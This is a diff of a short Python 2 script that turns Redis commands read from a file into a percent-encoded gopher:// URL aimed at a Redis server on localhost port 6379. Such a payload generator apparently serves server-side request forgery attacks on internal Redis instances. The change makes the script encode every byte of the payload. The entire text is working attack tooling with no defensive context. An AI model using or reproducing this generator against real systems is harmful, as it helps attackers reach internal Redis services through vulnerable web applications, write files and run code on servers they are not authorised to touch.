@@ -3,6 +3,9 @@ import urllib
 HOST = "127.0.0.1"
 PORT = "6379"
 
+def ord2hex(string):
+    return '%'+'%02x' % (ord(string))
+    
 exp = "gopher://%s:%s/_" % (HOST, PORT)
 
 for line in open("redis.cmd", "r"):
@@ -32,9 +35,9 @@ for line in open("redis.cmd", "r"):
             else:
                 word += char
     #print redis_resps
-    tmp_line = '*' + str(len(redis_resps)) + '%0d%0a'
+    tmp_line = '*' + str(len(redis_resps)) + '\r\n'
     for word in redis_resps:
-        tmp_line += '%24' + str(len(word)) + '%0d%0a' + urllib.quote(word) +  '%0d%0a'
-    exp += tmp_line
+        tmp_line += '$' + str(len(word)) + '\r\n' + word + '\r\n'
+    exp += "".join([ord2hex(i) for i in tmp_line])
 
 print exp
